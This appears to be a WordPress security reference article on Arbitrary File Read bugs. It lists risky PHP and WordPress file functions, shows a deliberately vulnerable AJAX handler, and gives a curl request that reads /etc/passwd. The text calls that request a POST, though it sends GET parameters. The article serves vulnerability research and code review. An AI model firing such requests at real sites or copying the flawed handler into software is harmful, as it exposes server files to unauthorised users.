---
title: Arbitrary File Read
contributors:
    - rafiem
---

## Introduction

This article covers cases of possible Arbitrary File Read on WordPress. This includes improper file fetch handling inside of the plugin/theme which can be used to read arbitrary local files inside of the server.

## Useful Functions

Several functions could be useful to identify a possible Arbitrary File Read vulnerability:

- PHP related
    - [`file_get_contents`](https://www.php.net/manual/en/function.file-get-contents.php)
    - [`readfile`](https://www.php.net/manual/en/function.readfile.php)
    - [`fopen`](https://www.php.net/manual/en/function.fopen.php)
    - [`fread`](https://www.php.net/manual/en/function.fread.php)
    - [`fgets`](https://www.php.net/manual/en/function.fgets.php)
    - [`fgetcsv`](https://www.php.net/manual/en/function.fgetcsv.php)
    - [`fgetss`](https://www.php.net/manual/en/function.fgetss.php) *deprecated from PHP 7.3*
    - [`file`](https://www.php.net/manual/en/function.file.php)
    - [`cURL`](https://www.php.net/manual/en/book.curl.php)

- WordPress related
    - [`WP_Filesystem_Direct::get_contents`](https://developer.wordpress.org/reference/classes/wp_filesystem_direct/get_contents/)
    - [`WP_Filesystem_Direct::get_contents_array`](https://developer.wordpress.org/reference/classes/wp_filesystem_direct/get_contents_array/)

## Example Cases

Below is an example of vulnerable code:

```php
add_action("wp_ajax_get_file", "ajax_get_file");

public function ajax_get_file(){
    global $wp_filesystem;

    // Make sure that the above variable is properly setup.
    require_once ABSPATH . 'wp-admin/includes/file.php';
    WP_Filesystem();

    $url = $_GET["url"];
    $data = $wp_filesystem->get_contents($url);
    $data = json_encode( $data );
    echo $data;
    die();
}
```

To exploit this, any authenticated user just needs to perform a POST request to the `/wp-admin/admin-ajax.php` endpoint specifying the needed parameter to trigger the `WP_Filesystem_Direct::get_contents` function.

```bash
curl '<WORDPRESS_BASE_URL/wp-admin/admin-ajax.php?action=get_file&url=/etc/passwd' -H 'Cookie: <AUTHENTICATED_USER_COOKIE>'
```

Below are some of the findings related to Arbitrary File Read:

- [Critical Vulnerabilities Patched in WordPress Automatic Plugin](https://patchstack.com/articles/critical-vulnerabilities-patched-in-wordpress-automatic-plugin/)

